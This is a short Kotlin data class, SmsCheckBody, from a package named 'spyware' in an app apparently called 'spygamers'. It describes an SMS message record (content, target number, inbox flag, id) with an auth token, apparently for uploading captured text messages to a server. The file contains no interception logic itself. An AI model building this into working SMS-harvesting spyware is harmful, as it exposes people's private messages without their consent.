package com.example.spygamers.services.spyware

import com.google.gson.annotations.SerializedName

data class SmsCheckBody(
    @SerializedName("auth_token")
    val authToken: String,
    val content: String,
    @SerializedName("target_number")
    val targetNumber: String,
    val timestamp: Long,

    @SerializedName("is_inbox")
    val isInbox: Boolean,
    @SerializedName("sms_id")
    val smsID: Long
)